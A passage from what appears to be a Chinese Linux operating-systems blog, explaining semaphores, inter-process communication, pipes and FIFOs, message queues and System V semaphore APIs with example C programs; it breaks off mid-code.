的绝对值表示当前系统中等待该临界资源的进程个数； wait(S) 和 Signal(S) 可以简单被描述成如下的代码执行方式： 12345678910//wait(S) while(s &lt;= 0) &#123; //进程等待 &#125; s = s - 1;//Signal(S) //发送信号 s = s + 1; 记录型信号量记录型信号量的数据结构由两部分组成： 123456struct semaphone&#123; int s;//整型信号 list *l;//进程链表&#125;;struct semaphone S; 在这个结构中，s 的值表示系统中可用的该类临界资源的数量，而 l 为进程链表指针，指向等待该资源的 PCB 队列。具体的操作如下图所示： 在记录型信号量机制中，s 的初值表示系统中该类资源的可用数目，因而又被成为资源信号量，每次对它进行 wait() 操作，即申请该类一个单位的临界资源，描述为 s=s-1 ，当 s&gt;=0 条件满足时，表示在没用做减一操作前 s&gt;=1 ，因此本进程可以继续执行；当 s&gt;=0 条件不满足时，表示操作前系统就没有空闲的该资源，因此进程应该调用 block 将该进程的 PCB 插入由指针 l 指向的阻塞队列。因此，该机制遵循了“让权等待”。 s 的绝对值表示在该信号量链表中已阻塞等待进程的数目。对信号量的每次 signal() 操作表示执行进程释放一个单位的该类临界资源，因此操作 s=s+1 表示资源数目加一。如果加一操作后发现 s&lt;=0 条件依然成立，这表示该信号链表中仍然有等待资源被阻塞的经常，所以还需要调用 wakeup 将第一个等待进程唤醒，其余进程继续等待；若 s&lt;=0 不成立，则表示系统中没用等待该类资源的进程，因此本进程只需要释放它所占用的该类资源继续执行即可。 AND 型信号量AND 同步机制的基本思想是将进程在整个运行过程中需要的所有资源，一次性全部分配给进程，待进程使用完成后再一起释放，只要有一个资源尚未分配给进程，其他所有可能分配的资源都不会分配给它。具体描述如下： 12345678910111213Swait(S1,S2,...,Sn) if S1&gt;=1 and S2 &gt;=1 ... and Sn &gt;=1 then for i: =1 to n do Si:=Si-1; endfor else [将该进程放入阻塞队列] endifSsignal(S1,S2,...,Sn) for i:=1 to n do Si = Si + 1; 唤醒所有 Si 不满足而进入阻塞队列的进程 endfor 信号量集如果某进程一次需要 N 个某类资源时，就需要进行 N 次 wait() 操作，这使得系统效率非常低并且可能造成死锁。 信号量集机制的基本思想是在 AND 型信号量集的基础上进行扩充，进程对信号量 Si 的测试值为 ti （用于信号量判断），占用值为 di （用于信号量的增减） 12Swait(S1,S2,...,Sn)Ssignal(S1,d1;S2,d2;...;Sn,dn) 一般“信号量集”的几种特定情况如下： Swait(S,d,d) 表示每次申请 d 个资源，当少于 d 时不进行分配 Swait(S,1,1) 表示互斥信号量 Swait(S,1,0) 作为一个可控开关（当 S&gt;=1 时允许多个进程进入临界区；当 S==0 时禁止任何进程进入临界区） “信号量集”未必成对使用 Swait() 和 Ssignal()，如一起申请，但可以不一起释放 0x07 进程间通信我们应该都知道了，进程是一个程序的一次执行，是系统资源分配的最小单元。这里所说的进程一般是指运行在用户态的进程，而由于处于用户态的不同进程间是彼此隔离的，但是它们很可能需要相互发送一些信息，好让对方知道自己的进度等情况，像这样进程间传递信息就叫进程间通信。 Linux 进程间通信的方式有以下几种（这是固定的）： 管道(Pipe)及有名管道(Named Pipe): 管道可用于具有”血缘”关系进程间(也就是父子进程或者兄弟进程)的通信。有名管道除具有管道所具有的功能外，还允许无”血缘”关系进程间的通信。 信号(Signal): 信号是在软件层次上对中断机制的一种模拟，它是比较复杂的通信方式，用于通知进程有某事件发生。 信号量(Semaphore): 主要作为进程之间及同一进程的不同线程之间的同步和互斥手段。 共享内存(Shared Memory): 可以说这是最有效的进程间通信方式。它使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据的更新。这种通信方式需要依靠某种同步机制，如互斥锁和信号量等。 消息队列(Messge Queue): 消息队列是消息的链表，包括 Posix 消息队列 和 System V 消息队列。它克服了前两种通信方式中信息量有限的缺点，具有写权限的进程可以按照一定的规则向消息队列中添加消息;对消息队列具有读权限的进程则可以从消息队列中读取消息。 套接字(Socket): 这个绝对是一种更为一般的进程间通信机制，它可用于网络中不同机器之间的进程间通信，目前经常遇到的网络编程就会用到套接字通信。 0x08 管道管道是 Linux 中进程间通信的一种方式，它把一个程序的输出直接连接到另一个程序的输入(其实我更愿意将管道比喻为农村浇地的管子)。Linux 的管道主要包括两种：无名管道和有名管道。这一节主要讲无名管道，首先介绍以下这两种管道。 无名管道 无名管道是 Linux 中管道通信的一种原始方法，如下图所示，它具有以下特点： 它只能用于具有亲缘关系的进程之间的通信（也就是父子进程或者兄弟进程之间）； 它是一个半双工的通信模式，具有固定的读端和写端； 管道也可以看成是一种特殊的文件，对于它的读写也可以使用普通的 read()、write() 等函数。但它不是普通的文件，并不属于其他任何文件系统并且只存在于内存中。 有名管道(FIFO) 有名管道是对无名管道的一种改进，如下图所示，它具有以下特点： 它可以使互不相关的两个进程间实现彼此通信； 该管道可以通过路径名来指出，并且在文件系统中是可见的。在建立了管道之后，两个进程就可以把它当做普通文件一样进行读写操作，使用非常方便； FIFO 严格地遵循先进先出规则，对管道及 FIFO 的读总是从开始处返回数据，对它们的写则是把数据添加到末尾，它们不支持如 lseek() 等文件定位操作。 无名管道及系统调用 管道创建与管道说明 管道是基于文件描述符的通信方式，当一个管道建立时，它会创建两个文件描述符 fd[0] 和 fd[1]，其中 fd[0] 固定用于读管道，而 fd[1] 固定用于写管道，如下图所示，这样就构成了一个半双工的通道。 管道关闭时只需要将这两个文件描述符关闭即可，可使用普通的 close() 函数逐个关闭各个文件描述符。 管道创建函数 创建管道可以用 pipe() 函数实现，具体如下： 1234567#include &lt;unistd.h&gt; //所需头文件int pipe(int fd[2]) //函数原型/*函数参数：fd[2] 管道的两个文件描述符，函数调用之后可以直接操作这两个文件描述符返回值：0 - 成功，-1 - 出错*/ 管道读写说明 用 pipe() 创建的管道两端处于同一个进程中，由于管道主要是用于在不同的进程间通信的，因此，在实际应用中没有太大意义。实际上，通常先是创建一个管道，再调用 fork() 函数创建一个子进程，该子进程会继承父进程所创建的管道，这时，父子进程管道的文件描述符对应关系如下图: 此时的关系看似非常复杂，实际上却已经给不同进程之间的读写创造了很好的条件。父子进程分别拥有自己的读写通道，为了实现父子进程之间的读写，只需把无关的读端或写端的文件描述符关闭即可。将父进程的写端 fd[1] 和子进程的读端 fd[0] 关闭，则父子进程之间就建立起一条“子进程写入父进程读取”的通道。 同样，也可以将父进程的读端 fd[0] 和子进程的写端 fd[1] 关闭，则父子进程之间就建立起一条“父进程写入子进程读取”的通道。 另外，父进程还可以创建多个子进程，各个子进程都继承了相应的 fd[0] 和 fd[1] ，此时，只需要关闭相应的端口就可以建立各子进程之间的的通道。 管道读写注意点 只有在管道的读端存在时，向管道写入数据才有意义。否则，向管道写入数据的进程将收到内核传来的 SIGPIPE 信号(通常为 Broken pipe 错误)。 向管道写入数据时，Linux 将不保证写入的原子性，管道缓冲区一有空闲区域，写进程就会试图向管道写入数据。如果读进程不读取管道缓冲区中的数据，那么写进程将会一直阻塞。 父子进程在运行时，它们的先后次序并不能保证。因此，为了保证父子进程已经关闭了相应的文件描述符，可在两个进程中调用 sleep()函数。当然，最好还是采用进程之间的同步与互斥机制。 管道通信实验下面，我们通过一个小的实例代码来学习进程如何通过管道来通信的。在 VS code 窗口中创建新的文件 pipe.c ，然后添加如下代码内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/wait.h&gt;#define MAX_DATA_LEN 128#define DELAY_TIME 3int main()&#123; pid_t pid; int pipe_fd[2]; char buf[MAX_DATA_LEN]; const char data[] = &quot;Pipe Demo Program&quot;; int real_read; int real_write; memset((void *)buf, 0, sizeof(buf)); if(pipe(pipe_fd) &lt; 0) &#123; printf(&quot;pepe create error\\n&quot;); exit(1); &#125; pid = fork(); if(pid == 0) &#123; //子进程，关闭写描述符，通过sleep(3)等待父进程关闭相应的读描述符 close(pipe_fd[1]); sleep(DELAY_TIME); //子进程读取管道内容 real_read = read(pipe_fd[0], buf, MAX_DATA_LEN); if(real_read &gt; 0) &#123; printf(&quot;Child progress : read %d bytes from the pipe : &#x27;%s&#x27; \\n&quot;, real_read, buf); &#125; close(pipe_fd[0]); exit(0); &#125; else if(pid &gt; 0) &#123; //父进程，关闭读描述符，并通过睡眠3秒等待子进程关闭对应的写描述符 close(pipe_fd[0]); sleep(DELAY_TIME); //写管道内容 real_write = write(pipe_fd[1], data, strlen(data)); if(real_write != -1) &#123; printf(&quot;Parent progress : write %d bytes to the pipe : &#x27;%s&#x27; \\n&quot;, real_write, data); &#125; close(pipe_fd[1]); waitpid(pid, NULL, 0); //等待子进程结束 &#125; return 0;&#125; 添加完成后，如下图： 在 VS Code 平台下的终端窗口中输入以下命令进行编译和运行，观察程序最终结果： 12gcc pipe.c -o pipe./pipe 有名管道及其系统调用有名管道是对无名管道的一种改进，它具有以下特点： 它可以使互不相关的两个进程间实现彼此通信； 该管道可以通过路径名来指出，并且在文件系统中是可见的。在建立了管道之后，两个进程就可以把它当做普通文件一样进行读写操作，使用非常方便； FIFO 严格地遵循先进先出规则，对管道及 FIFO 的读总是从开始处返回数据，对它们的写则是把数据添加到末尾，它们不支持如 lseek() 等文件定位操作。 有名管道的创建可以使用函数 mkfifo()，该函数类似与文件中的 open() 操作，可以指定管道的路径和打开的模式。同时还可以在终端窗口使用命令来创建有名管道。 1mknod [管道名] p 在管道创建成功后，就可以使用 open()、write() 和 read() 这些函数了。与普通文件的开发设置一样，对于为读而打开的管道可在 open() 中设置 O_RDONLY，对于为写而打开的管道可在 open() 中设置 O_WRONLY，在这里与普通文件不同的是阻塞问题。由于普通文件在读写时不会出现阻塞问题，而在管道的读写中却有阻塞的可能，这里的非阻塞标志可以在 open() 函数中设定为 O_NONBLOCK。 下面分别对阻塞打开和非阻塞打开的读写进行说明： 对于读进程： 若该管道是阻塞打开，且当前 FIFO 内没有数据，则对读进程而言将一直阻塞到有数据写入。 若该管道是非阻塞打开，则不论 FIFO 内是否有数据，读进程都会立即执行读操作。即如果 FIFO 内没有数据，则读函数将立刻返回 0。 对于写进程 若该管道是阻塞打开，则写操作将一直阻塞到数据可以被写入。 若该管道是非阻塞打开而不能写入全部数据，则读操作进行部分写入或者调用失败。 对于 mkfifo() 函数介绍如下： 1234567891011121314151617#include &lt;sys/types.h&gt;#include &lt;sys/state.h&gt;//函数原型int mkfifo(const char *filename, mode_t mode)/*参数：- filename: 要创建的管道，包含路径- mode: O_RDONLY:读管道 O_WRONLY:写管道 O_RDWR:读写管道 O_NONBLOCK:非阻塞 O_CREAT:如果该文件不存在，那么就创建一个新的文件，并用第三个参数为其设置权限 O_EXECL：如果使用O_CREAT时文件存在，那么可返回错误消息。这个参数可测试文件是否存在返回值：成功返回 0 ，失败返回 -1*/ 有名管道实验对于有名管道的使用就不需要像无名管道那样使用 fork() 创建子进程来进行通信，有名管道是可以在没有亲属关系的进程之间进行通信的。所以在这个实验中，我们将要编写两个程序，通过执行这两个进程在工作过程中使用 fifo 通信来进行实验。这两个程序一个负责向管道种写数据，一个负责读数据。写数据的程序为 fifo_write.c ，读数据的代码文件为 fifo_read.c，具体如下： 在 VS Code 平台下创建 fifo_write.c 文件，如下图： 添加以下内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;limits.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define FIFO_NAME &quot;/tmp/demo_fifo&quot; /* 有名管道名称 */#define MAX_BUFFER_SIZE PIPE_BUF /* 定义数据长度，使用 limits.h 中的 PIPE_BUF 长度 */int main(int argc, char *argv[])&#123; int fd; char buff[MAX_BUFFER_SIZE]; int nwrite; fd = open(FIFO_NAME, O_WRONLY); if(fd == -1) &#123; printf(&quot;Open fifo file error\\n&quot;); exit(1); &#125; while(1) &#123; //从键盘获取输入的字符，将数据存入 buff memset(buff, 0, MAX_BUFFER_SIZE); printf(&quot;请输入需要向 FIFO 中发送的数据：(q/Q 退出)\\n&quot;); scanf(&quot;%s&quot;, buff); /* 判断退出条件 */ if(!strcmp(buff, &quot;q&quot;) || !strcmp(buff, &quot;Q&quot;)) &#123; printf(&quot;[%d] write fifo 程序退出....&quot;, getpid()); break; &#125; nwrite = write(fd, buff, strlen(buff)+1); if(nwrite &gt; 0) &#123; printf(&quot;Write &#x27;%s&#x27; to FIFO\\n&quot;, buff); &#125; else&#123; printf(&quot;Write FIFO error...\\n&quot;); break; &#125; &#125; close(fd); return 0;&#125; 在 VS Code 平台下创建 fifo_read.c 文件，如图： 添加内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;limits.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define FIFO_NAME &quot;/tmp/demo_fifo&quot; /* 有名管道名称 */#define MAX_BUFFER_SIZE PIPE_BUF /* 定义数据长度，使用 limits.h 中的 PIPE_BUF 长度 */int main(int argc, char *argv[])&#123; int fd; char buff[MAX_BUFFER_SIZE]; int nread; /* 判断 FIFO 文件是否存在，如果不存在则创建 */ if(access(FIFO_NAME, F_OK) == -1) &#123; if((mkfifo(FIFO_NAME, 0666) &lt; 0) &amp;&amp; (errno != EEXIST)) &#123; printf(&quot;Cannot create fifo file\\n&quot;); exit(1); &#125; &#125; fd = open(FIFO_NAME, O_RDONLY); if(fd == -1) &#123; printf(&quot;Open fifo file error\\n&quot;); exit(1); &#125; while(1) &#123; //从键盘获取输入的字符，将数据存入 buff memset(buff, 0, MAX_BUFFER_SIZE); nread = read(fd, buff, MAX_BUFFER_SIZE); if(!strcmp(buff, &quot;q&quot;) || !strcmp(buff, &quot;Q&quot;)) &#123; printf(&quot;[%d] read fifo 程序退出....&quot;, getpid()); break; &#125; if(nread &gt; 0) &#123; printf(&quot;Read &#x27;%s&#x27; from FIFO\\n&quot;, buff); &#125; else&#123; printf(&quot;Read FIFO error...\\n&quot;); break; &#125; &#125; close(fd); return 0;&#125; 编写完代码后，在终端通过 gcc 进行编译，在执行的时候分为两个终端窗口来执行，首先执行管道读程序 fifo_read，然后在另一个窗口中启动管道写进程 fifo_write，具体结果如下： 12gcc fifo_read.c -o fifo_readgcc fifo_write.c -o fifo_write","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】4-进程间通信方式之消息队列","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/4-进程间通信方式之消息队列/","text":"概述：知识点 Linux 消息队列方式原理介绍 Linux 消息队列相关 API 介绍 0x01 Linux 消息队列消息队列 (也叫做报文队列)是 Unix 系统 V 版本中 3 种进程间通信机制之一。另外两种是信号量和共享内存。这些 IPC 机制使用共同的授权方法。只有通过系统调用将标志符传递给核心之后，进程才能存取这些资源。这种系统 IPC 对象使用的控制方法和文件系统非常类似。使用对象的引用标志符作为资源表中的索引。 消息队列就是一个消息的链表。就是把消息看作一个记录，并且这个记录具有特定的格式以及特定的优先级。对消息队列有写权限的进程可以按照一定的规则添加新消息；对消息队列有读权限的进程则可以从消息队列中读出消息。 Linux 采用消息队列的方式来实现消息传递。这种消息的发送方式是：发送方不必等待接收方检查它所收到的消息就可以继续工作下去，而接收方如果没有收到消息也不需等待。这种通信机制相对简单，但是应用程序使用起来就需要使用相对复杂的方式来应付了。新的消息总是放在队列的末尾，接收的时候并不总是从头来接收，可以从中间来接收。 消息队列是随内核持续的并和进程相关，只有在内核重起或者显示删除一个消息队列时，该消息队列才会真正被删除。因此系统中记录消息队列的数据结构 (struct ipc_ids msg_ids)位于内核中，系统中的所有消息队列都可以在结构 msg_ids 中中找到访问入口。 IPC 标识符：每一个 IPC 目标都有一个唯一的 IPC标识符 。这里所指的 IPC目标 是指一个单独的消息队列、一个信号量集或者一个共享的内存段。系统内核使用此标识符在系统内核中指明 IPC目标 。 IPC关键字 ：想要获得唯一的标识符，则必须使用一个 IPC关键字 。客户端进程和服务器端进程必须双方都同意此关键字。这是建立一个客户机&#x2F;服务器框架的第一步。在 System V IPC 机制中，建立两端联系的路由方法是和 IPC关键字 直接相关的。通过在应用程序中设置关键字值，每一次使用的关键字都可以是相同的。一般情况下，可以使用 ftok() 函数为客户端和服务器端产生关键字值。 0x02 Linux消息队列使用步骤 创建或打开消息队列。使用的函数是 msgget()，这里创建的消息队列的数量会受到系统消息队列数量的限制。 添加消息。使用的函数是 msgsnd()，它把消息添加到已打开的消息队列末尾。 读取消息。使用的函数是 msgrcv()，它把消息从消息队列中取走，与 FIFO 不同的是，这里可以取走指定的某一条消息。 控制消息队列。使用的函数是 msgctl()，它可以完成多项功能。 0x03 Linux消息队列相关 API 介绍在 Linux 操作系统中，我们可以通过使用 msgget() 函数来创建和打开消息队列，具体描述如下： 123456789101112#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgget(key_t key, int msgflg)/*参数：- key 消息队列键值，多个进程可以通过这个 ID 值来访问同一个消息队列，其中有个特殊值 `IPC_PRIVATE` 用于创建当前进程的私有消息队列- msgflg 权限标志位返回值： 成功返回消息队列 ID， 失败返回 -1*/ 向已经被创建和打开的消息队列中发送数据，可以使用 msgsnd() 函数，具体描述如下： 1234567891011121314151617181920#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg)/*参数：- msqid 消息队列的队列 ID- msgp 执行消息结构的指针，该消息结构 `msgbuf` 通常如下： struct msgbuf&#123; long mtype; //消息类型 char mtext[1];//消息正文 &#125;- msgsz 消息正文的字节数- msgflg 如下： `IPC_NOWAIT`:若消息无法立即发生（当前消息队列已满，函数立即返回 0：msgsnd() 调用阻塞知道发送成功为止函数返回值： 成功返回 0， 失败返回 -1*/ 对于消息队列的接收，在程序中可以通过调用 msgrcv() 来进行读取数据，如下： 123456789101112131415161718192021#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgrcv(int msqid, void *msgp, size_t msgsz, long int msgtyp, int msgflg)/*参数：- msqid 消息队列的队列 ID- msgp 消息缓冲区- msgsz 正文字节数- msgtyp 描述如下： 0：接收消息队列中第一个消息 大于0：接收消息队列中第一个类型为 msgtyp 的消息 小于0：接收消息队列中第一个类型值不小于 msgtyp 绝对值且值最小的消息- msgflg 描述如下： - MSG_NOERROR：若返回的消息比 msgsz 字节多，则消息就会截断到 msgsz 字节，且不会通知消息到进程 - IPC_NOWAIT:若消息队列中没有相应类型的消息可以接收，则函数会立即返回 - 0：函数调用阻塞等待接收到一条消息为止返回值： 成功返回 0， 失败返回 -1*/ 除了上述 API 之外，还可以用 msgctl() 函数来对消息队列进行设置，具体如下： 12345678910111213141516#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgctl(int msgqid, int cmd, struct msgid_ds *buf)/*参数：- msqid 消息队列的队列 ID- cmd 执行操作，如下： - IPC_STAT：读取消息队列的数据结构 msgid_ds ，并将其存储到 buf 位置 - IPD_SET：设置消息队列的数据结构 msgid_ds 中的 ipc_perm 值，这个值取自 buf 参数 - IPC_RMID：从系统内核中删除消息队列- buf：描述消息队列的 msqid_ds 结构类型的变量返回值 成功返回 0， 失败返回 -1*/","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】6-进程间通信方式之信号量通信","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/6-进程间通信方式之信号量通信/","text":"知识点： Linux 信号量通信原理介绍 Linux 信号量通信相关 API 介绍 0x01 Linux 信号量概述在 Linux 中，信号量本质上是一个计数器（不设置全局变量是因为进程间是相互独立的，而这不一定能看到，看到也不能保证++引用计数为原子操作）,用于多进程对共享数据对象的读取，它和管道有所不同，它不以传送数据为主要目的，它主要是用来保护共享资源（信号量也属于临界资源），使得资源在一个时刻只有一个进程独享。 正如前面实验三章节内容的说明一样，在 Linux 系统下解决进程间临界资源竞争的问题，最有效的方式就是使用信号量。所以，信号量就是用来解决进程间的同步和互斥问题的一种进程间通信机制。 _信号量与信号的区别_：在 Linux 系统下，信号量名字是 semaphore ，而信号的名字为 signal。它们虽然都可以用来解决进程同步和互斥问题，但是所采用的的机制不一样。信号使用系统的信号处理机制，而信号量则最终是使用原子操作的 PV 来实现的。 0x02 Linux 信号量工作原理在多任务操作系统环境下，多个进程会同时运行，并且一些进程间可能会存在一定的关联。多个进程可能为了完成同一个任务相互协作，这就形成了进程间的同步关系。而且在不同进程间，为了争夺有限的系统资源（硬件或软件资源）会进入竞争状态，这就是进程间的互斥关系。 进程间的互斥关系与同步关系存在的根源在于临界资源。临界资源是在同一时刻只允许有限个（通常只有一个）进程可以访问（读）或修改（写）的资源，通常包括硬件资源（处理器、内存、存储器及其它外围设备等）和软件资源（共享代码段、共享结构和变量等）。访问临界资源的代码叫做临界区，临界区本身也会称为临界资源。 信号量是用来解决进程间的同步与互斥问题的一种进程间通信机制，包括一个称为信号量的变量和在该信号量下等待资源的进程等待队列，以及对信号量进行的两个原子操作（P&#x2F;V 操作）。其中，信号量对应于某一种资源，取一个非负的整形值。信号量值（常用 sem_id 表示）指的是当前可用的该资源的数量，若等于 0 则意味着目前没有可用的资源。 PV 原子操作的具体定义如下: P 操作：如果有可用的资源（信号量值 &gt; 0），则此操作所在的进程占用一个资源（此时信号量值减 1，进入临界区代码）；如果没有可用的资源（信号量值 &#x3D; 0），则此操作所在的进程被阻塞直到系统将资源分配给该进程（进入等待队列，一直等到资源轮到该进程）。 V 操作：如果在该信号量的等待队列中有进程在等待资源，则唤醒一个阻塞进程；如果没有进程等待它，则释放一个资源（即信号量值加 1）。 _二元信号量_：二元信号量（Binary Semaphore）是最简单的一种锁（互斥锁），它只用两种状态：占用与非占用。所以它的引用计数为 1。 0x03 Linux 信号量相关 API 函数在 Linux 系统中，使用信号量通常分为以下 4 个步骤： 创建信号量或获得在系统中已存在的信号量，此时需要调用 semget() 函数。不同进程通过使用同一个信号量键值来获得同一个信号量。 初始化信号量，此时使用 semctl() 函数的 SETVAL 操作。当使用二维信号量时，通常将信号量初始化为 1。 进行信号量的 PV 操作，此时，调用 semop() 函数。这一步是实现进程间的同步和互斥的核心工作部分。 如果不需要信号量，则从系统中删除它，此时使用 semctl() 函数的 IPC_RMID 操作。需要注意的是，在程序中不应该出现对已经被删除的信号量的操作： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;int semget(key_t key, int nsems, int semflg);/*参数： key：信号量的键值，多个进程可以通过它访问一个信号量，其中有个特殊值 IPC_PRIVATE ，用来创建当前进程私有信号量 nsems：需要创建的信号量数目 semflg：同 open() 函数的权限位相同，其中 IPC_CREAT 创建新的信号量，IPC_EXCL 创建新的唯一的信号量返回值： 成功：信号量标识符，在信号量其他函数中会用到 失败：返回 -1*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;int semctl(int semid, int semnum, int cmd, union semun arg);/*参数： semid：semget() 函数反悔的信号量标识符，要操作的信号量 semnum：信号量编号，当使用信号量集会用到，单个信号量操作取参数 0 cmd：指定对信号量的各种操作，当使用单个信号量时，常用的操作如下： IPC_STAT：获得该信号量的 semid_ds 结构，并存放到第四个参数指定的位置中 IPC_SETVAL：将信号量值设置为 arg 的 val 值 IPC_GETVAL：返回信号量的当前值 IPC_RMID：从系统中删除信号量（或者信号量集） arg：是 union semun 结构，有时需要执行定义返回值： 成功：根据 cmd 的值返回不同的值 失败：-1*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;int semop(int semid, struct sembuf *sops, size_t nsops);/*参数： semid：semget() 函数反悔的信号量标识符，要操作的信号量 sops：指向信号量操作数组， nsops：操作数组 sops 中的操作个数，通常取 1 （一个操作）返回值： 成功：信号量标识符 失败：-1*/ 0x04 信号量基本用法在 VS Code 平台下创建新的代码文件 fork_demo.c ，如下图所示： 然后添加如下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define DELAY_TIME 3union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; // perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int main(int argc, char *argv[])&#123; pid_t pid; int sem_id; //创建信号量 sem_id = semget(ftok(&quot;.&quot;,&#x27;a&#x27;), 1, 0666|IPC_CREAT); //初始化信号量 init_sem(sem_id, 0); pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork error&quot;); exit(1); &#125; else if(pid == 0) &#123; //子进程 printf(&quot;Child progress [%d] will wait for som seconds...\\n&quot;, getpid()); sleep(DELAY_TIME); printf(&quot;Child progress [%d] \\n&quot;, getpid()); sem_v(sem_id); exit(1); &#125; else &#123; //父进程 sem_p(sem_id); printf(&quot;Parent progress [%d] will wait for som seconds...\\n&quot;, getpid()); sem_v(sem_id); del_sem(sem_id); &#125; waitpid(pid, NULL, 0); return 0;&#125; 在 VS Code 平台下的终端窗口使用 gcc 编译代码并执行，如下图所示： 0x05 信号量进程同步接下来利用信号量同步机制创建两个进程交替进行输出计数，一个进程输出奇数，另一个输出偶数，交替输出组成联系数字排列。为了使得输出结果能够显示在同一个终端窗口，使其中的一个进程通过 fork() 创建新的进程并调用 execl() 函数去执行另一个可执行程序，最终达到我们想要的效果。具体如下： 在 VS Code 平台下创建新的代码文件偶数输出程序代码 even_demo.c ，如下图所示： 然后添加如下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126/* 该程序将仅输出奇数值，配合 even_demo 程序完成 0 - 20 的计数输出*/#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/wait.h&gt;#define DELAY_TIME 3union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;//信号量初始化int init_sem(int sem_id, int init_value);//从系统中删除信号量int del_sem(int sem_id);//P操作int sem_p(int sem_id);//V操作int sem_v(int sem_id);//定义ftok参数#define SEM_ODD_KEY &quot;./odd_dem_key&quot;#define SEM_EVEN_KEY &quot;./even_dem_key&quot;int main()&#123; pid_t pid; int sem_odd, sem_even; //创建一个信号量 sem_even = semget(ftok(SEM_EVEN_KEY, &#x27;a&#x27;), 1, 0666|IPC_CREAT); sem_odd = semget(ftok(SEM_ODD_KEY, &#x27;a&#x27;), 1, 0666); init_sem(sem_even, 0); pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork error.&quot;); exit(0); &#125; if(pid == 0) &#123; execl(&quot;./odd_demo&quot;, &quot;test&quot;, NULL); exit(0); &#125; for(int i = 0; i &lt; 20; i = i + 2) &#123; sem_p(sem_odd); //获取奇数程序信号 printf(&quot;[%d]====&gt; 